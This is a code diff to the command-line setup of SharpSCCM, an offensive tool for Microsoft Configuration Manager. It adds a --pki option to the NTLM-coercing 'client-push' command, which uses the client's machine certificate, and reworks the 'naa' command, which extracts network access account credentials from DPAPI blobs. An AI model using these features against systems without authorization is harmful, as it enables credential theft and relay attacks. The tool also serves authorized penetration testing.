@@ -1,10 +1,11 @@
-﻿using Microsoft.ConfigurationManagement.Messaging.Framework;
+using Microsoft.ConfigurationManagement.Messaging.Framework;
 using System;
 using System.CommandLine;
 using System.CommandLine.Builder;
 using System.CommandLine.NamingConventionBinder;
 using System.CommandLine.Parsing;
 using System.Diagnostics;
+using System.IO;
 using System.Management;
 using System.Reflection;
 
@@ -105,9 +106,7 @@ namespace SharpSCCM
                 getCommand.AddGlobalOption(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code of the Configuration Manager server (e.g., PS1) (default: the site code of the client running SharpSCCM)"));
                 getCommand.AddGlobalOption(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values (default: false)"));
                 Option whereOption = new Option<string>(new[] { "--where", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"Name='cave.johnson'\" or \"Name LIKE '%cave%'\")");
-                whereOption.Name = "whereCondition";
-                // Using reflection to alias the "where" option to "whereCondition"
-                typeof(Option).GetMethod("RemoveAlias", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(whereOption, new object[] { whereOption.Name });
+                whereOption.AddAlias("whereCondition");
                 getCommand.AddGlobalOption(whereOption);
 
                 // get application
@@ -148,6 +147,7 @@ namespace SharpSCCM
                 getClassInstances.Handler = CommandHandler.Create(
                     (string server, string siteCode, bool count, string wmiNamespace, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                     {
+                        Console.WriteLine($"where: {whereCondition}");
                         ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, wmiNamespace, siteCode);
                         if (properties.Length == 0)
                         {
@@ -322,19 +322,31 @@ namespace SharpSCCM
                 var invokeClientPush = new Command("client-push", "Force the server to authenticate to an arbitrary destination via NTLM (requires automatic client push installation to be enabled and NTLM fallback to not be disabled)");
                 invokeCommand.Add(invokeClientPush);
                 invokeClientPush.Add(new Option<bool>(new[] { "--as-admin", "-a" }, "Connect to the server via WMI rather than HTTP to force authentication (requires Full Administrator access and device record for target)"));
+                invokeClientPush.Add(new Option<bool>(new[] { "--pki", "-p" }, "Use the client's PKI certificate for authentication to the management point"));
                 invokeClientPush.Add(new Option<string>(new[] { "--target", "-t" }, "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server (default: the machine running SharpSCCM)"));
                 invokeClientPush.Handler = CommandHandler.Create(
-                    (string server, string siteCode, bool asAdmin, string target) =>
+                    (string server, string siteCode, bool asAdmin, bool pki, string target) =>
                     {
                         if (server == null || siteCode == null)
                         {
                             (server, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                         }
                         if (!asAdmin)
-                        {
-                            MessageCertificateX509 certificate = MgmtPointMessaging.CreateUserCertificate();
-                            SmsClientId clientId = MgmtPointMessaging.RegisterClient(certificate, target, server, siteCode);
-                            MgmtPointMessaging.SendDDR(certificate, target, server, siteCode, clientId);
+                        { 
+                            // If PKI certs are in use, borrow the client's authentication cert to update its hardware inventory
+                            if (pki)
+                            {
+                                MessageCertificateX509 certificate = MgmtPointMessaging.GetMachineSigningCertificate();
+                                SmsClientId clientId = ClientWmi.GetSmsId();
+                                MgmtPointMessaging.SendDDR(certificate, target, server, siteCode, clientId);
+                            }
+                            // Otherwise, create a self-signed certificate and new device record
+                            else
+                            {
+                                MessageCertificateX509 certificate = MgmtPointMessaging.CreateUserCertificate();
+                                SmsClientId clientId = MgmtPointMessaging.RegisterClient(certificate, target, server, siteCode);
+                                MgmtPointMessaging.SendDDR(certificate, target, server, siteCode, clientId);
+                            }
                         }
                         else
                         {
@@ -368,6 +380,15 @@ namespace SharpSCCM
                 // local
                 var localCommand = new Command("local", "A group of commands to interact with the local workstation/server");
                 rootCommand.Add(localCommand);
+
+                // local all
+                var localAllChecks = new Command("all", "Run all local situational awareness checks");
+                localCommand.Add(localAllChecks);
+                localAllChecks.Handler = CommandHandler.Create(
+                    new Action(() =>
+                    {
+                        ClientFileSystem.AllChecks();
+                    }));
 
                 // local class-instances
                 var localClassInstances = new Command("class-instances", "Get information on local WMI class instances");
@@ -419,6 +440,37 @@ namespace SharpSCCM
                         System.IO.File.WriteAllLines("C:\\Program Files\\Microsoft Configuration Manager\\inboxes\\ccr.box\\test.ccr", lines);
                     });
 
+                // local grep
+                var localGrep = new Command("grep", "Search a specified file for a specified string");
+                localCommand.Add(localGrep);
+                localGrep.Add(new Argument<string>("path", "The full path to the file (e.g., \"C:\\Windows\\ccmsetup\\Logs\\ccmsetup.log"));
+                localGrep.Add(new Argument<string>("string-to-find", "The string to search for"));
+                localGrep.Handler = CommandHandler.Create(
+                    (string path, string stringToFind) =>
+                        ClientFileSystem.GrepFile(path, stringToFind)
+                    );
+
+                // local naa
+                var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site using WMI (requires admin privileges)");
+                localCommand.Add(getLocalNetworkAccessAccounts);
+                getLocalNetworkAccessAccounts.Add(new Argument<string>("method", "The method of obtaining the DPAPI blob: WMI or Disk"));
+                getLocalNetworkAccessAccounts.Handler = CommandHandler.Create(
+                    (string method, string masterkey) =>
+                    {
+                        if (method == "wmi")
+                        {
+                            Credentials.LocalNetworkAccessAccountsWmi();
+                        }
+                        else if (method == "disk")
+                        {
+                            Credentials.LocalNetworkAccessAccountsDisk();
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] A method (wmi or disk) is required!");
+                        }
+                    });
+
                 // local push-logs
                 var localPushLogs = new Command("push-logs", "Search for evidence of client push installation");
                 localCommand.Add(localPushLogs);
@@ -428,53 +480,6 @@ namespace SharpSCCM
                         //To-do
                         //LocalPushLogs();
                     }));
-
-                // local grep
-                var localGrep = new Command("grep", "Search a specified file for a specified string");
-                localCommand.Add(localGrep);
-                localGrep.Add(new Argument<string>("path", "The full path to the file (e.g., \"C:\\Windows\\ccmsetup\\Logs\\ccmsetup.log"));
-                localGrep.Add(new Argument<string>("string-to-find", "The string to search for"));
-                localGrep.Handler = CommandHandler.Create(
-                    (string path, string stringToFind) =>
-                        ClientFileSystem.LocalGrepFile(path, stringToFind)
-                    );
-
-                // local naa
-                var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site using WMI (requires admin privileges)");
-                localCommand.Add(getLocalNetworkAccessAccounts);
-                getLocalNetworkAccessAccounts.Add(new Argument<string>("method", "The method of obtaining the DPAPI blob: WMI or Disk"));
-                getLocalNetworkAccessAccounts.Add(new Option<bool>(new[] { "--modify-registry-permissions", "-reg" }, "Modify the permissions on the LSA secrets registry key as current admin user. Default is escalation to system via token duplication."));
-                getLocalNetworkAccessAccounts.Handler = CommandHandler.Create(
-                    (string method, bool reg) =>
-                    {
-                        if (method == "wmi")
-                        {
-                            if (reg)
-                            {
-                                Credentials.LocalNetworkAccessAccountsWmi(reg);
-                            }
-                            else
-                            {
-                                Credentials.LocalNetworkAccessAccountsWmi();
-                            }
-                        }
-                        else if (method == "disk")
-                        {
-                            if (reg)
-                            {
-                                Credentials.LocalNetworkAccessAccountsDisk(reg);
-                            }
-                            else
-                            {
-                                Credentials.LocalNetworkAccessAccountsDisk();
-                            }
-                        }
-                        else
-                        {
-                            Console.WriteLine("[!] A method (wmi or disk) is required!");
-                        }
-                    }
-                );
 
                 // local siteinfo
                 var localSiteInfo = new Command("siteinfo", "Get the primary Management Point and Site Code for the local host");
